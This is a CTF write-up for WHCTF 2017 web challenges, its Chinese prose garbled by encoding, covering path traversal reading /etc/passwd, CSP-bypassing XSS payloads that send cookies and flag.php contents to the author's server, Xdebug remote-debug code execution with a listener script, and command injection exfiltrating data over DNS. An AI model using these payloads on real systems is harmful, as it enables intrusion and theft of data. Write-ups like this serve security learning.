---
title:  WHCTF 2017 Web  Write-up
subtitle: CTF
time: 2017.09.18 10:00:00
layout: post
catalog: true
tags:
- CTF
- Web

excerpt: WHCTFçš„Webé¢˜è§£ã€‚å’Œå®éªŒå®¤å„ä½å¤§ä½¬ä»¬ä¸€èµ·æ‰“äº†è¿™ä¸ªèµ›å­£çš„ç¬¬ä¸€åœºCTFã€‚è¿™åœºæ¯”èµ›çš„Webé¢˜ç›®è´¨é‡è¿˜æ˜¯è›®ä¸é”™çš„ï¼Œå­¦åˆ°äº†ä¸€äº›æ–°çš„æ€è·¯ã€‚åœ¨æ­¤æ„Ÿè°¢å„ä½å‡ºé¢˜äººçš„ç²¾å¿ƒå‡†å¤‡ä¸è¾›è‹¦è¿ç»´ã€‚ä¸è¿‡è¿™åœºæ¯”èµ›æœ€å¤§çš„é—æ†¾å°±æ˜¯å‰§æƒ…ç«Ÿç„¶è¢«åè½¬äº†ğŸ˜¢ã€‚æœç„¶å‡ºæ¥æ··ï¼Œè¿˜æ˜¯è¦è¿˜çš„orzã€‚ä¸Šä¸ªèµ›å­£ç¬¬ä¸€åœºä¸å°å¿ƒç»æ€äº†ä¸€æ³¢AAAï¼Œè¿™æ¬¡è¢«AAAç»æ€äº†ä¸€æ³¢ã€‚

---


# WHCTF

![èµ›å†µ](https://mo-xiaoxi.github.io/img/post/whctf/whctf.png)

## SCANNER

URL:http://118.31.18.64:20008/c181948a9bdee64753468823ac57a870/github.com/

é¦–å…ˆï¼Œæ‰«æèƒ½æ‰«åˆ°ä¸€ä¸ªrobots.txtï¼ˆæ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯è‡³å°‘å¯ä»¥çŸ¥é“ä¸€å®šæ˜¯éœ€è¦æ‰«æçš„ï¼‰

```
# There Is Nothing
User-agent: *
Disallow: /ScannerISg00d
```

```
http://118.31.18.64:20008/ hello world
```

è¿™æ˜¯ä¸€ä¸ªåä»£Githubçš„ç«™ï¼Œåä»£ç†äº†æ—§ç‰ˆæœ¬çš„Githubã€‚

åœ¨ç”¨é‡å‹æ‰«æå™¨æ‰«æçš„æ—¶å€™ï¼Œèƒ½æ‰«åˆ°ä¸€äº›XSSçš„ç‚¹ã€‚

```
http://118.31.18.64:20008/c181948a9bdee64753468823ac57a870/help.github.com/index.php?q=1'"()%26%25<acx><ScRiPt%20>alert(9122)</ScRiPt>&utf8=%e2%9c%93
```

ä½†æ˜¯ï¼Œå¥ˆä½•å­—å…¸ä¸ç»™åŠ›ï¼Œä¸€ç›´æ²¡æ‰«åˆ°å•¥æœ‰ç”¨çš„ä¿¡æ¯ã€‚åæ¥åšåšç”¨å¾¡å‰‘æ‰«äº†ä¸€æ³¢ï¼Œå‘ç°äº†ä¸€ä¸ªå¥‡æ€ªçš„é¡µé¢ã€‚

http://118.31.18.64:20008/c181948a9bdee64753468823ac57a870/github.com/getimg.php

ä¼šå¾—åˆ°ä¸€ä¸ªè¿”å›åŒ…ï¼š

```http
HTTP/1.1 200 OK
Date: Sun, 17 Sep 2017 03:14:20 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.20
Content-Length: 8
Connection: close
Content-Type: image/jpeg

Hacker!
```

æ˜¾ç„¶ï¼Œæ”»å‡»ç‚¹å°±åœ¨è¿™ã€‚

ç„¶åï¼Œå°±æ˜¯ä¸€ä¸ªå¾ˆç¥å¥‡çš„æ€è·¯ã€‚

> ç®—æ˜¯è„‘æ´å§.getimg.phpçŒœå‚æ•°ä¸ºpicï¼Œç„¶åæ˜¯ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„åŠŸèƒ½ã€‚
>
> PS:æˆ‘åœ¨æµ‹è¯•çœŸæ­£çš„githubç«™æ—¶ï¼Œå‘ç°æœç´¢çš„å†…å®¹ä¼šæœ‰ä¸€ä¸ªé¢„å…ˆåŠ è½½çš„è¿‡ç¨‹ï¼Œä¸€å¼€å§‹æ˜¯ä¸€ä¸ªå›¾ç‰‡åŠ è½½å†…å®¹,å¯èƒ½çœŸæ­£æ—§ç‰ˆæœ¬çš„Githubæ˜¯æœ‰getimgè¿™ä¸ªåŠŸèƒ½çš„ï¼ŸMaybeã€‚ã€‚

```http
GET /c181948a9bdee64753468823ac57a870/github.com/getimg.php?pic=../../../../../../etc/passwd HTTP/1.1
Host: 118.31.18.64:20008
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: __utma=13406071.113045772.1505529039.1505529039.1505529039.1; __utmz=13406071.1505529039.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=htgpdqchfo3hi3h3q2suo22fk2; tz=Asia%2FShanghai
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

çŒœæµ‹æ˜¯ä¸€ä¸ªè¯»æ–‡ä»¶çš„æ“ä½œï¼Œå°è¯•è¯»å–ä¸€æ³¢ã€‚

```http
HTTP/1.1 200 OK
Date: Sun, 17 Sep 2017 03:18:06 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.20
Content-Length: 1355
Connection: close
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
flag:x:11:11:flag:/home/flag/a89ca65d:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
mysql:x:105:108:MySQL Server,,,:/var/lib/mysql/:/bin/false
```

å¯ä»¥è¯»ï¼Œé‚£ä¹ˆå°è¯•è¯»flagå†…å®¹ã€‚è€Œ/etc/passwdä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªflagç”¨æˆ·ã€‚

```
flag:x:11:11:flag:/home/flag/a89ca65d:/usr/sbin/nologin
```

å°è¯•è¯»å–ä¸€æ³¢

```http
GET /c181948a9bdee64753468823ac57a870/github.com/getimg.php?pic=/home/flag/a89ca65d HTTP/1.1
Host: 118.31.18.64:20008
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: __utma=13406071.113045772.1505529039.1505529039.1505529039.1; __utmz=13406071.1505529039.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=htgpdqchfo3hi3h3q2suo22fk2; tz=Asia%2FShanghai
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

å¾—åˆ°flag

```
WHCTF{D0_Y0u_Th1nk_Sc4nner_15_Usefu1}
```



## NOT_ONLY_XSS

> url:http://118.31.15.206:20006/

æŠ“åŒ…ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªCSPã€‚CSPé™åˆ¶å¾ˆå¼±ï¼Œä¸€ä¸ªä¸ªç›²æµ‹ä¸€ä¸‹ã€‚

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';style-src 'self' 'unsafe-inline';img-src *;
```

å‘ç°å¯ä»¥é€šè¿‡imgæ ‡ç­¾ç»•è¿‡ï¼Œ```<img src='ip'>```

è¯·æ±‚åŒ…å¦‚ä¸‹ï¼š

```html
POST / HTTP/1.1
Host: 118.31.15.206:20006
Content-Length: 140
Cache-Control: max-age=0
Origin: http://118.31.15.206:20006
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://118.31.15.206:20006/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: PHPSESSID=pvna84asmituchrrvl8kh4h5s5
Connection: close

name=mo+xiaoxi&email=x%40gmail.com&phone=15084762817&verify=828188&secret=%3Cimg+src%3D%27http%3A%2F%2F45.62.96.72%3A5678%27%3E
```

åœ¨VPSä¸Šå¯ä»¥æ”¶åˆ°è¿™æ ·çš„æ•°æ®

![XSS1](https://mo-xiaoxi.github.io/img/post/whctf/NOT_ONLY_XSS1.jpeg)

ç„¶åï¼Œè®¿é—®ä¸€ä¸‹é¡µé¢

`http://118.31.15.206:20006/upload/26a155556d805e00c4c5a845e9418515.html`

å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¡µé¢ä¸ä»…æœ‰CSPçš„é™åˆ¶ï¼Œè¿˜æœ‰ä¸€ä¸ªfilter.jsä»£ç ã€‚è¿™ä¸ªä»£ç ä¼šé™åˆ¶å¾ˆå¤šJSçš„æ“ä½œã€‚

é€šè¿‡æœ¬åœ°æµ‹è¯•ï¼Œä»¥ä¸‹ä»£ç å¯ä»¥ç»•è¿‡é™åˆ¶

```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline';style-src 'self' 'unsafe-inline';img-src *;">
<script src='../js/filter.js'></script>
<h2>Phone</h2> 15084760817<br>
<h2>secret</h2><br>
<img src="http://45.62.96.72:5678/11">
<script>
    var ss = "http://45.62.96.72:5679/2/?p="+document.cookie;
    var elem = document.createElement("img");
    elem.setAttribute("src", ss);
    document.body.appendChild(elem);
</script>
<h2>Email</h2>momomomoxiaoxi@gmail.com
```

![XSS2](https://mo-xiaoxi.github.io/img/post/whctf/NOT_ONLY_XSS2.png)

å¯ä»¥å¼¹åˆ°æ•°æ®ï¼ï¼ˆè¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆè¦å¼¹ä¸¤æ¬¡ã€‚ä¸»è¦æ˜¯ä¸ºäº†é€šè¿‡ç¬¬ä¸€ä¸ªimgè·å–ç”Ÿæˆçš„ç½‘é¡µçš„å…·ä½“ç½‘å€ã€‚å¥½å½“å‘ç°åé¢çš„jsä»£ç æ²¡æœ‰æ‰§è¡Œæ—¶ï¼Œè·å–åŸå§‹é¡µé¢å†…å®¹ï¼ŒæŸ¥çœ‹æ˜¯å¦æ˜¯è¯­æ³•é”™è¯¯æˆ–è€…å…¶å®ƒï¼Œæ–¹ä¾¿è°ƒè¯•ï¼‰

æ¥ä¸‹é‡Œå°±æ‰å…¥ä¸€ä¸ªå¤§å‘ä¸­äº†ã€‚åœ¨æµ‹è¯•ä¸­ï¼Œå‘ç°è¿™ä¸ªpayloadåœ¨è¿œç¨‹æ°¸è¿œæ— æ³•æ‰§è¡Œã€‚å¾ˆè¿·ã€‚ã€‚

åæ¥ï¼Œæ‰å‘ç°æäº¤çš„ä»£ç ä¸­jså­—ç¬¦ä¸²æ‹¼æ¥çš„+å·ï¼Œç›´æ¥æäº¤æ—¶ä¼šè¢«è§£ç æˆç©ºæ ¼ç”Ÿæˆé¡µé¢ã€‚é‚£ä¹ˆåé¢çš„jsä»£ç å°±æœ‰è¯­æ³•é”™è¯¯ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œã€‚

![XSS3](https://mo-xiaoxi.github.io/img/post/whctf/NOT_ONLY_XSS3.png)

æ‰€ä»¥ï¼Œåœ¨æäº¤çš„æ—¶å€™éœ€è¦å¯¹+ç¼–ç ã€‚

æ­¤æ—¶ï¼ŒJSèƒ½å¤ŸæˆåŠŸæ‰§è¡Œï¼Œä½†æ˜¯document.cookieæ˜¯ç©ºï¼Œè¯´æ˜ä¸æ˜¯æ‰“cookieçš„å€¼ã€‚åæ¥ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªflag.phpæ–‡ä»¶ã€‚è¿™é‡Œå¾ˆç¥å¥‡ï¼Œæœ¬æ¥æ„Ÿè§‰åŸºæœ¬æ²¡åŠæ³•è¯»å–ã€‚å› ä¸ºæ˜¯flag.phpï¼Œæ„Ÿè§‰adminè®¿é—®å’Œç”¨æˆ·è®¿é—®åº”è¯¥æ˜¾ç¤ºçš„æ˜¯ä¸€æ ·çš„ï¼ˆè¿™é‡Œæ— cookieæœºåˆ¶ï¼Œå³æ²¡æƒé™åŒºåˆ†ã€‚å½“ç„¶å¯èƒ½æ˜¯httponlyçš„Cookieï¼Œæ‰“ä¸å‡ºæ¥ï¼‰ã€‚ä½†æ˜¯ï¼Œåæ¥æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€ï¼Œçªç„¶æŠŠflagæ‰“åˆ°äº†ã€‚è¿™é‡Œçš„é—®é¢˜åœ¨äºXSS botæ˜¯ä»¥PhantomJS/2.1.1å¼€å‘çš„ï¼Œè€Œå®ƒå¯ä»¥ç›´æ¥è¯»å–åˆ°æºç ã€‚

payloadï¼š

```html
POST / HTTP/1.1
Host: 118.31.15.206:20006
Content-Length: 303
Cache-Control: max-age=0
Origin: http://118.31.15.206:20006
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://118.31.15.206:20006/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: PHPSESSID=1cmok66ci2idscuhaq8b5649s6
Connection: close

name=mo+xiaoxi&email=momomomoxiaoxi%40gmail.com&phone=15084760817&verify=541274&secret=<img src="http://45.62.96.72:5678/11"><script>var xhr = new XMLHttpRequest();var url = "../flag.php";xhr.open("GET", url, true);xhr.send(null);setTimeout(function(){console.log(xhr);var ss = "http://45.62.96.72:5679/?p="%2bescape(xhr.responseText);var elem = document.createElement("img");elem.setAttribute("src", ss);document.body.appendChild(elem);}, 3000);</script>
```

å›æ˜¾ä¿¡æ¯ï¼š

![4](https://mo-xiaoxi.github.io/img/post/whctf/NOT_ONLY_XSS4.png)

è§£ç ï¼š

```php
<?php

$flag="WHCTF{phant0mjs_c4n_open_f1les_1n_webp4ge}";
echo "Flag is here! But nobody can got it!";
?>
```

> PS:è¿™é‡Œurlä¸èƒ½å†™æˆ'http://127.0.0.1/flag.php
>
> å› ä¸ºä¼šè¿åcsp=ã€‹default-src 'self'
>
> index.html:2 Refused to connect to 'http://127.0.0.1/flag.php' because it violates the following Content Security Policy directive: "default-src 'self'". Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.

## EMMM

è¿™é¢˜åªæœ‰ä¸€ä¸ªphpinfoã€‚ä¸€å¼€å§‹çœ‹åˆ°PHPçš„ç‰ˆæœ¬æ˜¯7ï¼Œå°±ä»¥ä¸ºæ˜¯PHP7çš„Opacheå¤–åŠ åˆ©ç”¨phpinfoçš„ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¥åˆ©ç”¨ã€‚ä½†æ˜¯ï¼Œåæ¥ä»”ç»†æ¢³ç†äº†ä¸€ä¸‹ï¼Œç”±äºæ²¡æœ‰æ–‡ä»¶åŒ…å«ç‚¹ï¼Œæ— æ³•åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ çš„ç«äº‰é—®é¢˜æ‰§è¡Œä»£ç ã€‚æ­¤å¤–ï¼Œä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„å’ŒOpacheçš„ä¸´æ—¶æ–‡ä»¶è·¯å¾„ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œæ— æ³•è¦†ç›–ï¼Œæ€è·¯å·²æ­»ã€‚

> 1. [åˆ©ç”¨PHP 7ä¸­çš„OPcacheæ¥å®ç°Webshell](http://bobao.360.cn/learning/detail/2858.html)
> 2. [åˆ©ç”¨phpinfoä¿¡æ¯LFIä¸´æ—¶æ–‡ä»¶](http://bobao.360.cn/learning/detail/94.html)

åæ¥ï¼Œå­¦å¼Ÿè¯´ç½‘ç«™å¼€äº†XDEBUGè¿œç¨‹è°ƒè¯•ï¼Œå¯ä»¥å°è¯•XDEBUGçš„è¿œç¨‹è°ƒè¯•è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œã€‚äºæ˜¯å­¦ä¹ ä¸€æ³¢è¿œç¨‹è°ƒè¯•ï¼Œå°±èƒ½å¾—åˆ°flagã€‚è¿™é‡Œæœ‰ä¸€ä¸ªæœ‰æ„æ€çš„ç‚¹ï¼ŒXDEBUGçš„è¿œç¨‹è°ƒè¯•æ˜¯ç”±ä¸€ä¸ªæ¨¡æ‹Ÿçš„shellçª—å£çš„ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¿™ç‚¹å’Œä¸€å¥è¯æœ¨é©¬ä¸Šä¼ åï¼Œç”¨èœåˆ€æ‰§è¡Œshellçš„åŸç†ç±»ä¼¼ã€‚è™½ç„¶è¿™ä¸ªæ€è·¯é™åˆ¶æ¯”è¾ƒå¤§ï¼Œä½†ä¹Ÿæ˜¯å¯¹phpinfoæ³„æ¼çš„åˆ©ç”¨ä¹Ÿæ˜¯ä¸€ç§æ‰©å±•ã€‚

PHPè¿œç¨‹è°ƒè¯•çš„é™åˆ¶ï¼š

1. Xdebugå·¥ä½œæ¨¡å¼ä¸ºxdebug.remote_connect_back = 1 è¿™ç§æ–¹å¼php åœ¨ æ¥å— http è¯·æ±‚åï¼Œxdebug ä¼šå°†è¯·æ±‚æ¥æºçš„ IP ç»‘å®šï¼Œå¹¶é€šçŸ¥ï¼Œè€Œéé™æ€ç»‘å®šå•ä¸€å®¢æˆ·ç«¯ã€‚
2. è·¯å¾„æ˜ å°„ä¸‹çš„ç¯å¢ƒéœ€è¦ç›¸åŒã€‚å³ä½ å¾—çŸ¥é“è¦è°ƒè¯•çš„è¿œç¨‹phpæ–‡ä»¶çš„ç³»ç»Ÿè·¯å¾„ï¼Œè¿˜èƒ½å¾—åˆ°æ–‡ä»¶çš„æºç ã€‚é™åˆ¶å¾ˆå¤§ã€‚
3. æœ¬åœ°å’Œè¿œç¨‹çš„IDEKEYå¾—ç›¸åŒã€‚
4. æ”»å‡»æœºæœ€å¥½æœ‰å…¬ç½‘IPï¼Œä¿è¯èƒ½å¤ŸæˆåŠŸæ”¶åˆ°åå¼¹æ•°æ®ã€‚

> 1. [XDEBUGåŸç†](https://laravel-china.org/articles/4090/the-first-step-to-becoming-a-senior-php-programmer-debugging-xdebug-principle)
> 2. [æœ¬åœ°XDEBUGé…ç½®](https://www.bbsmax.com/A/gAJGGDabJZ/)
> 3. [è¿œç¨‹XDEBUGé…ç½®](https://paper.seebug.org/308/) æ¨è

å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œä½ å¯ä»¥å¾—åˆ°è¿™æ ·çš„è¿œç¨‹è°ƒè¯•ç•Œé¢ã€‚ï¼ˆç”±äºè¿œç¨‹æœåŠ¡å™¨å·²ç»æŒ‚äº†ï¼Œè¿™é‡Œæ²¡æœ‰åœ¨è¿œç¨‹å¤ç°ï¼‰

åœ¨æœ¬åœ°çš„consoleä¸‹ï¼Œä½ å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è™½ç„¶consoleä¸­å›æ˜¾çš„æ•°æ®æœ‰é•¿åº¦é™åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»é¡µé¢ä¸Šè·å–è¯¦ç»†ä¿¡æ¯ã€‚ï¼ˆè¿œç¨‹è°ƒè¯•æ—¶ï¼Œå°±æ˜¯è¿œç¨‹é¡µé¢ï¼‰

![xdebug4](https://mo-xiaoxi.github.io/img/post/whctf/xdebug4.png)

![xdebug5](https://mo-xiaoxi.github.io/img/post/whctf/xdebug5.png)

è¿™é‡Œæ”¾ä¸€å¼ å½“æ—¶åšé¢˜æ—¶å€™ï¼Œå­¦å¼Ÿæˆªçš„å›¾ã€‚

![xdebug3](https://mo-xiaoxi.github.io/img/post/whctf/xdebug3.png)



æ­¤å¤–ï¼Œå½“æ²¡æœ‰phpinfoï¼Œä½†æ˜¯è¿œç¨‹æœåŠ¡å™¨è¿˜æ˜¯å¼€å¯äº†XDEBUGçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å…¶è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ªæ€è·¯å¯ä»¥å‚è€ƒricterz.meå†™çš„[åšå®¢](https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface)ï¼Œå¾ˆæœ‰æ„æ€ã€‚è€Œä¸”ï¼Œricterz.meçš„æ€è·¯ç»•è¿‡äº†ä¸Šæ–‡çš„2ã€3é™åˆ¶ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æŠ€å·§ï¼Œå€¼å¾—å­¦ä¹ ï¼

æ¯”å¦‚ä½ å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„curlå‘½ä»¤æµ‹è¯•è¿œç¨‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨XDEBUGè°ƒè¯•çš„æ¼æ´ã€‚

![xdebug2](https://mo-xiaoxi.github.io/img/post/whctf/xdebug2.png)

å½“ `X-Forwarded-For` åœ°å€çš„ 9000 ç«¯å£æ”¶åˆ°å¦‚ä¸Šï¼Œå°±å¯ä»¥ç¡®å®šå¼€å¯äº† Xdebugï¼Œå¹¶ä¸”å¼€å¯äº† `xdebug.remote_connect_back`ã€‚

ricterè¿˜å†™äº†ä¸€ä¸ªè„šæœ¬ç”¨æ¥åˆ©ç”¨è¿™ç§é…ç½®æ¼æ´ï¼š

```python
#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```

è¿è¡Œæƒ…å†µå¦‚ä¸‹ï¼Œå¯ä»¥è¿›è¡Œä»»æ„PHPä»£ç æ‰§è¡Œã€‚

![xdebug](https://mo-xiaoxi.github.io/img/post/whctf/xdebug.png)

ricterzè¿˜åˆ†æäº†xdebugçš„å…¶ä»–ä¸€äº›å¯åˆ©ç”¨çš„å‘½ä»¤ã€‚å…·ä½“è¯·å¤§å®¶é˜…è¯»ä»–çš„[åšå®¢](https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface)ã€‚

## CAT

http://120.55.42.243:20010/index.php?url=%a0

djangoè°ƒè¯•æ¨¡å¼æ‰“å¼€äº†ï¼Œè¾“å…¥%a0ä¹‹ç±»çš„å­—ç¬¦å¯ä»¥è·å¾—æŠ¥é”™ä¿¡æ¯ï¼Œæ‹¿åˆ°ä¸€éƒ¨åˆ†æºç 

```python
/opt/api/dnsapi/views.py in wrapper
       # åˆå¹¶ requests.FILES å’Œ requests.POST
       for k, v in request.FILES.items():
           if isinstance(v, InMemoryUploadedFile):
               v = v.read()
           request.FILES[k] = v
       request.POST.update(request.FILES)
       return f(*args, **kwargs)
...
   return wrapper
@process_request
def ping(request):
â–¶ Local vars
/opt/api/dnsapi/views.py in ping
   return wrapper
@process_request
def ping(request):
   # è½¬ä¹‰
   data = request.POST.get('url')
   data = escape(data)
...
   if not re.match('^[a-zA-Z0-9\-\./]+$', data):
       return HttpResponse("Invalid URL")
   return HttpResponse(os.popen("ping -c 1 \"%s\"" % data).read())
â–¶ Local vars
/opt/api/dnsapi/utils.py in escape
   r = ''
   for i in range(len(data)):
       c = data[i]
       if c in ('\\', '\'', '"', '$', '`'):
           r = r + '\\' + c
       else:
           r = r + c
   return r.encode('gbk')
...
```

è¿™é‡Œç”¨äº†dnsçš„apiã€‚é¡¿æ—¶å°±æƒ³åˆ°æ¯•è®¾çš„ä¸€ä¸ªæ“ä½œï¼ˆæ§åˆ¶æŒ‡å®šä¸€ä¸ªåŸŸåçš„è§£ææœåŠ¡å™¨å®ç°DNSéš§é“ï¼‰ã€‚

æœ¬åœ°æµ‹è¯•ï¼š

```
ping -c 1 "`whoami`.xiaoxi.pegasusx.top"
```

å‘½ä»¤ä¼šè½¬åŒ–ä¸º

```
ping -c 1 "xiaoxi.xiaoxi.pegasusx.top"
```

è€Œæˆ‘ä»¬åœ¨åŸŸåè§£æä¸Šé…ç½®ï¼Œæ‰€æœ‰xxx.xiaoxi.pegasusx.topéƒ½åˆ°æˆ‘ä»¬æŒ‡å®šçš„ä¸€ä¸ªæœåŠ¡å™¨è¿›è¡Œè§£æã€‚å…·ä½“é…ç½®å‚è€ƒè¿™ç¯‡[åšæ–‡](https://mo-xiaoxi.github.io/2016/11/30/DNStunnel/)

> PS:åæœŸå‘ç°è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒé€šç”¨çš„æ€è·¯ï¼Œå°±æ˜¯DNSlogæ¥è·å–æ•°æ®ã€‚åœ¨SQLæ³¨å…¥å’Œå‘½ä»¤æ‰§è¡Œæ—¶ï¼Œå°¤å…¶æ˜¯æ²¡æœ‰å›æ˜¾æ—¶æœ‰ç¥å¥‡çš„ä½œç”¨ã€‚

å¯ä»¥åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šçœ‹åˆ°å¦‚ä¸‹æ•°æ®ï¼š

```bash
âœ  ~ tcpdump udp port 53 -X |grep xiaoxi.pegasusx.top
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on venet0, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes
03:40:43.847328 IP duhem.df.lth.se.45156 > ilovefyy.top.domain: 41249+ NULL? vaaaaaaaaaaaaa.xiaoxi.pegasusx.top. (52)
03:41:17.167469 IP 60.215.138.244.50302 > ilovefyy.top.domain: 33379% [1au] A? moxiaoxi.xiaoxi.pegasusx.top. (57)
03:41:17.967575 IP 60.215.138.244.44039 > ilovefyy.top.domain: 24630% [1au] A? moxiaoxi.xiaoxi.pegasusx.top. (57)
```

å¯ä»¥çœ‹åˆ°whoamiçš„ç»“æœè¢«å‘é€è¿‡æ¥äº†ã€‚è¿™æ˜¯å› ä¸ºpingä¸€ä¸ªåŸŸåæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è§£æé‚£ä¸ªåŸŸåï¼Œä»è€Œå°†é‚£ä¸ªåŸŸåä¿¡æ¯è½¬å‘åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šã€‚è€Œæˆ‘ä»¬å¯ä»¥æŠŠæƒ³è¦çš„ä¿¡æ¯æ”¾åœ¨åŸŸåçš„å‰ç¼€ä¸Šå‘é€åˆ°æˆ‘ä»¬çš„DNSè§£ææœåŠ¡å™¨ã€‚

æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯é€šè¿‡gbkç»•è¿‡æ­£åˆ™ï¼Œæ’å…¥ä¸€ä¸ª`.

```python
 data = escape(data)
...
   if not re.match('^[a-zA-Z0-9\-\./]+$', data):
       return HttpResponse("Invalid URL")
   return HttpResponse(os.popen("ping -c 1 \"%s\"" % data).read())
   
```

```
/opt/api/dnsapi/utils.py in escape
   r = ''
   for i in range(len(data)):
       c = data[i]
       if c in ('\\', '\'', '"', '$', '`'):
           r = r + '\\' + c
       else:
           r = r + c
   return r.encode('gbk')
```

æœ¬åœ°æ­å»ºä¸€ä¸ªç¯å¢ƒ,è¿›è¡Œæµ‹è¯•

```python
# coding:utf-8   
import re
import os

def escape(data):
   r = ''
   for i in range(len(data)):
       c = data[i]
       if c in ('\\', '\'', '"', '$', '`'):
           r = r + '\\' + c
       else:
           r = r + c
   return r.encode('gbk')


def test(data):
	data = escape(data)
	if not re.match('^[a-zA-Z0-9\-\./]+$', data):
		return "Invalid URL"
	print os.popen("ping -c 1 \"%s\"" % data)
	return (os.popen("ping -c 1 \"%s\"" % data)).read()

print test('baidu.com')
```

